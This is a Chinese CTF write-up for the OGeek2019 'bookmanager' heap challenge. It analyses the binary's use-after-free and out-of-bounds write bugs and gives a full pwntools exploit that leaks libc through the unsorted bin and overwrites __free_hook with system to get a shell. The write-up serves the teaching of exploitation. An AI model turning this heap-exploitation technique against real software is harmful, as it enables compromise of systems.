# OGeek2019-bookmanager



### 总结

本题比较简单，就是题目流程比较复杂一点，用到的知识点就一个：

- 当`chunk`被放置到`unsorted bin`中时，其`fd`指针会指向`main_arena+88`这个地址，可以用来泄露`libc`地址

<!-- more -->

### checksec

![image-20210602000302796](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602000302796.png)

保护全开，题目运行环境为`ubuntu 16.04`， `libc-2.23.so`。

### 题目分析

题目实现了对书的管理，包括章节、主题等。书所需要的内存都是从堆上分配的。

首先，分配`0x90`大小的内存，存放书的信息，结构如下：

![image-20210602002248381](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602002248381.png)

然后，每一个章节的结构，也是`0x90`大小的`chunk`，内存布局如下：

![image-20210602001849886](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602001849886.png)

然后每个`section`都是大小为`0x40`的`chunk`，其内存布局如下：

![image-20210602002137066](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602002137066.png)

`text_ptr`对应的大小由用户指定，输入大小不超过`0x100`

### 漏洞分析

漏洞点有`4`处，有两处在`add_text`函数中：

![image-20210602002547948](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602002547948.png)

第`40`行可以输入负数绕过校验，第`45`和`47`行，如果输入小于`0x100`的正数，则会越界写。

第三处在`remove_section`函数中：

![image-20210602002743952](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602002743952.png)

这里存在一个`UAF`漏洞。

第四出在`updapte`函数中：

![image-20210602002906056](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602002906056.png)

同样是会越界写，指定了写的大小为`0x100`。

其实还有一个，就是我标注的`read_off_by_one`函数，会越界写一个字节。但是也要注意，这个函数里有`memset(addr, 0, len)`，会把内存置为`0`。

### 利用思路

利用思路很多，因为题目漏洞给得实在是太多了，分享我的利用过程如下：

- 分配一个`0x100`大小的`chunk`，作为一个存储`text`的内存块，前面紧挨着一个`0x90`的内存块，可以被用作`chapter`
- 使用掉高地址的`chapter`，然后`update`低地址的`text`块。由于会把`0xff`的内存刷为`0`，所以必须要构造`0x100`大小的`text`内存块。直接填满`0x100`个`a`后。
- 使用`book_preview`，就会打印出`unsorted bin`的`fd`内容，得到`libc`地址
- 用`update`的越界写，修改某个`section`的`text_ptr`指针，修改为`__free_hook`的地址
- 然后`update`那个`section`的`text`，就是在往`__free_hook`写内容，填上`system`地址
- 释放带有`/bin/sh`的内存块，即可获得`shell`

### 最终EXP

**泄露地址**：

![image-20210602004334827](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602004334827.png)

**修改`text_ptr`**：

![image-20210602004445217](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602004445217.png)

**修改`__free_hook`为`system`地址**：

![image-20210602004559633](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602004559633.png)



```python
from pwn import *

LOG_ADDR = lambda x, y: info("{} ===> {}".format(x, hex(y)))

sh = process("./pwn")

libc = ELF('libc-2.23.so')

context.update(arch="amd64", os="linux", endian="little")

def add_book(book_name):
    sh.sendlineafter("Name of the book you want to create: ", book_name)


def add_chapter(chapter_name="abc"):
    assert len(chapter_name) <= 20, "len error!"
    sh.sendlineafter("\nYour choice:", "1")
    sh.sendlineafter("\nChapter name:", chapter_name)


def add_section(chapter_name="abc", section_name="123"):
    sh.sendlineafter("\nYour choice:", "2")
    sh.sendlineafter("\nWhich chapter do you want to add into:", chapter_name)
    leak_msg = sh.recvline()
    log.info("msg recv===>{}".format(leak_msg))
    sh.sendlineafter("Section name:", section_name)
    return leak_msg


def add_text(section_name="123", size:int=0x80, text="a"):
    sh.sendlineafter("\nYour choice:", "3")
    sh.sendlineafter("\nWhich section do you want to add into:", section_name)
    sh.sendlineafter("\nHow many chapters you want to write:", str(size))
    sh.sendlineafter("\nText:", text)


def remove_chapter(chapter_name="abc"):
    sh.sendlineafter("\nYour choice:", "4")
    sh.sendlineafter("\nChapter name:", chapter_name)


def remove_section(section_name="123"):
    sh.sendlineafter("\nYour choice:", "5")
    sh.sendlineafter("\nSection name:", section_name)


def remove_text(section_name="123"):
    sh.sendlineafter("\nYour choice:", "6")
    sh.sendlineafter("\nSection name:", section_name)


def book_preview():
    sh.sendlineafter("\nYour choice:", "7")
    sh.recvuntil("\nBook:")
    msg = sh.recvuntil("\n==========================")
    log.info("msg recv:{}".format(msg))
    return msg

def update(mode=0, old_name="abc", new_name="efg"):
    sh.sendlineafter("\nYour choice:", "8")
    sh.recvuntil("\nWhat to update?(Chapter/Section/Text):")
    if mode == 0:
        sh.sendline("Chapter")
        sh.sendlineafter("\nChapter name:", old_name)
        sh.sendlineafter("\nNew Chapter name:", new_name)
        sh.recvuntil("\nUpdated")
    elif mode == 1:
        sh.sendline("Section")
        sh.sendlineafter("\nSection name:", old_name)
        sh.sendlineafter("\nNew Section name:", new_name)
        sh.recvuntil("\nUpdated")
    else:
        sh.sendline("Text")
        sh.sendlineafter("\nSection name:", old_name)
        sh.sendafter("\nNew Text:", new_name)
        sh.recvuntil("\nUpdated")


# leak libc addr
add_book("xxe")
add_chapter("a")
add_section("a", "a.a")
add_text("a.a", 0xf0, "a.a.a")
add_chapter("b")
add_section("b", "b.a")
remove_chapter("b")
update(2, "a.a", "a" * 0x100)
msg = book_preview()
idx = msg.index(b"\x7f")
leak_libc_addr = u64(msg[idx-5:idx + 1].ljust(8, b"\x00"))
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
LOG_ADDR("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr

# recover
update(2, "a.a", flat("a"*0xf0, 0, 0x91))
add_chapter("b")
add_section("b", "b.a")
remove_text("a.a")
add_text("a.a", 0xb0, "a.a.b")

# change section's text_ptr
add_section("a", "/bin/sh")
layout = [0xb0 * "a", 0, 0x41, 
        "/bin/sh".ljust(8, "\x00"), [0] * 3, libc.sym["__free_hook"], 32]
update(2, "a.a", flat(layout, length=0x100, filler="\x00"))

# fill system addr at __free_hook
update(2, "/bin/sh", flat([libc.sym['system']], length=0x100, filler="\x00"))

# get shell
remove_section("/bin/sh")

sh.interactive()
```

远程打：

![image-20210602004700278](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210602004700278.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-06-01-ogeek2019-bookmanager/  

